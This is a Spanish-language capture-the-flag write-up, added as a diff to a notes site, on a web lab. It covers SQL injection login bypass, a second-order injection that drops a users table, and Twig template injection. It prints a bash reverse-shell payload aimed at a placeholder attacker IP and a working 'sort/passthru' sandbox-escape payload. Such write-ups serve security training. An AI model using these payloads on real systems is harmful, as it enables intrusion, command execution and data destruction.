@@ -3,3 +3,100 @@ layout: apunte
 title: "1. Getting the Flags"
 ---
 
+1. Vamos a empezar como siempre, con escaneos:
+	1. Primero un escaneo a la IP, general.
+	   !**Pasted image 20260117123157.png**
+	2. Luego un escaneo más profundo a aquellos puertos abiertos.
+	   !**Pasted image 20260117123343.png**
+	3. Seguimos con enumeración de directorios.
+	   !**Pasted image 20260117134945.png**
+	4. Vamos a buscar archivos comunes, para ello usamos `dirsearch` que ya prueba algunas extensiones comunes por defecto.
+	   !**Pasted image 20260117135831.png**
+	5. Miramos el código fuente.
+	   !**Pasted image 20260117131123.png**
+	   Parece que hemos encontrado un email válido y el archivo donde se guardan estos.
+2. Ahora que tenemos unos cuantos directorios vamos a recopilar información de la aplicación web.
+	1. Empezando por el archivo `robots.txt`.
+	   !**Pasted image 20260117123714.png**
+	   No existe por lo que ya lo descartamos.
+	2. Vamos a ver qué hay en la página principal.
+	   !**Pasted image 20260117123816.png**
+	   !**Pasted image 20260117123859.png**
+	3. Si buscamos en estos botones, todos nos llevan a `#` menos `Login` que nos lleva a `login.php`.
+	   !**Pasted image 20260117124157.png**
+	   Volveremos aquí más tarde.
+	4. Vamos a ver qué vemos por los directorios que habíamos sacado del escaneo de directorios.
+	   !**Pasted image 20260117124439.png**
+	   La página `phpmyadmin` es la única que no aparece `403 Forbidden`.
+3. Si miramos algunos de los archivos que encontramos con `dirsearch` encontramos lo siguiente.
+   !**Pasted image 20260117135932.png**
+   !**Pasted image 20260117140008.png**
+   Parece que hemos encontrado el framework de la web.
+4. Vamos a investigar la página `login.php`.
+	1. Si le damos a `Login as Admin`, nos lleva a la página `adminLogin007.php`.
+	   !**Pasted image 20260117124651.png**
+	2. Vamos a intentar iniciar sesión en el login normal y ver que pasa con Burp Suite.
+	   !**Pasted image 20260117130222.png**
+	   Salta esto y ni siquiera llega a salir del cliente.
+	3. Si investigamos un poco podemos llegar hasta el JS que hace que salte esta alerta.
+	   !**Pasted image 20260117130351.png**
+	   Aquí podemos ver que si esas palabras están contenidas no nos dejará acceder ni siquiera a la petición de login, al haber puesto "n**or**mal" está cogiendo el "or" dentro de esta.
+	4. Cambiamos el Email y volvemos a probar.
+	   !**Pasted image 20260117130816.png**
+	5. Ahora que ya tenemos la petición, vamos a jugar en Burp Suite.
+		1. Lo primero vamos a ver si el filtro de "OR" está sólo del lado del cliente.
+		   !**Pasted image 20260117130921.png**
+		   Hemos puesto "prueban**or**mal" y nos sale lo mismo que en la petición de arriba, por lo que parece que sí, sólo era un filtro del lado del cliente.
+		2. Vamos a probar a enviar ahora una petición con un correo real: `dev@injectics.thm`.
+		   !**Pasted image 20260117131359.png**
+		   Parece que no podemos obtener información de aquí. 
+5. Si recordamos el escaneo, había un archivo donde se guardaban los correos: `mail.log`
+   !**Pasted image 20260117131832.png**
+   Estas credenciales sólo valdrían si algo le pasara a la tabla `users` por lo que no nos valen.
+6. Vamos a probar diferentes payloads de alguna [lista de github](https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/SQL-Injection-Auth-Bypass-Payloads.txt) en el Intruder de Burp Suite. Primero probaremos en el campo email.
+   !**Pasted image 20260117133044.png**
+7. Después de esperar un poco obtenemos el payload.
+   !**Pasted image 20260117133252.png**
+8. Cambiamos la cookie de sesión `PHPSESSID` al valor hecho en la petición validada y vamos al endpoint que nos marca la respuesta.
+   !**Pasted image 20260117133650.png**
+9. Si recordamos lo que decía la página de `mail.log` era que si algo le pasaba a la tabla `users` se habilitarían las cuentas que aparecían allí. Vamos a editar alguna entrada y a corroborar esto.
+   !**Pasted image 20260117133809.png**
+   Después de hacer esto e intentar loguearnos como admin parece que nada cambia.
+10. Vamos a intentar introducir un cambio con una query (ataque de segundo orden SQLi).
+   !**Pasted image 20260117134336.png**
+   Parece que hay validación, vamos a cambiar el payload.
+11. Probamos ahora a quitar las comillas.
+    !**Pasted image 20260117134424.png**
+    Parece que ahora sí nos deja.
+    !**Pasted image 20260117134447.png**
+    Y encima se han cambiado todos los oros.
+12. Vamos a borrar la base de datos, por lo que decía en el email.
+    !**Pasted image 20260117134543.png**
+    !**Pasted image 20260117134601.png**
+13. Vamos ahora a iniciar sesión como admin.
+    !**Pasted image 20260117134659.png**
+14. Si recordamos el análisis, el motor de plantillas era twig que permite crear dinamismo mediante etiquetas como `{{ }}`.
+    !**Pasted image 20260117140315.png**
+15. Parece que es susceptible de SSTI.
+    !**Pasted image 20260117140343.png**
+16. Si probamos ahora a poner `{{ system("ls") }}`, nos salta con:
+    !**Pasted image 20260117140645.png**
+17. Encontramos la forma de mandarnos una reverse shell `{{ ["bash -c 'bash -i >& /dev/tcp/IP_ATACANTE/PUERTO_ATACANTE 0>&1'"] | map("system") | join }}`.
+	1. Nos ponemos en escucha.
+	   !**Pasted image 20260117141147.png**
+	2. Metemos el payload en la plantilla.
+	   !**Pasted image 20260117141308.png**
+	3. Por desgracia nos salta un error.
+	   !**Pasted image 20260117141615.png**
+18. Después de mucho quebradero de cabeza y de darnos cuenta de que estamos en una sandbox con restricciones (debido a que `passthru` lo pone), llegamos a un payload que funciona: `{{['id','']|sort('passthru')}}`. Aquí creamos un array así `['id', '']`. Después con sort especificamos la función de ordenado, pero esto no comprueba que sea una función de ordenado, solo lo intenta ejecutar. Passthru en PHP ejecuta un comando del sistema operativo y muestra su salida sin procesar.
+    !**Pasted image 20260117145310.png**
+    !**Pasted image 20260117145324.png**
+19. Listamos el directorio `/flags` sustituyendo `id` por `ls flags`.
+    !**Pasted image 20260117145453.png**
+20. Leemos el documento.
+    !**Pasted image 20260117145558.png**
+    
+21. Obtenemos la flag.
+    !**Pasted image 20260117145609.png**
+
+>[!SUCCESS] Hemos conseguido obtener ambas flags. Para ello hemos tenido que utilizar SQLi de primer y segundo orden para obtener la primera flag y más adelante SSTI para obtener la segunda flag.
